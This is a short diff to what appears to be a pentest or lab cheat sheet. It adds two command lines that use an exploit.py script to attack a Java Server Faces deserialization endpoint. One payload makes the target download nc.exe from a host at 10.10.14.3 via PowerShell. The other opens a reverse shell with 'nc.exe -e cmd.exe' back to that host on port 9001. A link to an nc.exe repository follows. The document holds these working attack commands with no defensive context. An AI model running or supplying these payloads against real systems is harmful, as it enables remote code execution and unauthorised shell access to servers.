@@ -6,3 +6,9 @@ rubydeserialization.rb - for *Ruby 3.X*
 
 
 ### Java Server Faces object deserialization exploit
+python3 exploit.py http://10.10.10.130:8080/userSubscribe.faces "\\programdata\\nc.exe -e cmd.exe 10.10.14.3 9001" SnNGOTg3Ni0=
+python3 exploit.py http://10.10.10.130:8080/userSubscribe.faces "powershell -command \\\"Invoke-WebRequest -Uri ht
+tp://10.10.14.3/nc.exe -outfile \\programdata\\nc.exe\\\"" SnNGOTg3Ni0=
+
++ Resources
+https://github.com/int0x33/nc.exe/
